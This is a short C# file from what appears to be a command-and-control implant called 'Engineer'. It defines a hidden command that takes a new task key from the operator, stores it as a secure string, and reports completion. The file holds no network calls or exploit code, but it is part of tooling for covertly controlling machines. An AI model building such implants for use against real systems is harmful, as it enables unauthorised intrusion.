using System.Security;
using System.Security.Policy;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands;

public class UpdateTaskKey : EngineerCommand
{
    public override string Name => "UpdateTaskKey";
    public override bool IsHidden => true;

    public override async Task Execute(EngineerTask task)
    {
        task.Arguments.TryGetValue("TaskKey", out string taskKey);
        Program.UniqueTaskKey = new SecureString();
        foreach (char c in taskKey)
        {
            Program.UniqueTaskKey.AppendChar(c);
        }
        taskKey = null;
        //Console.WriteLine($"TaskKey updated to {taskKey}");
        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("TaskKey updated", task, EngTaskStatus.Complete,TaskResponseType.String);

    }
}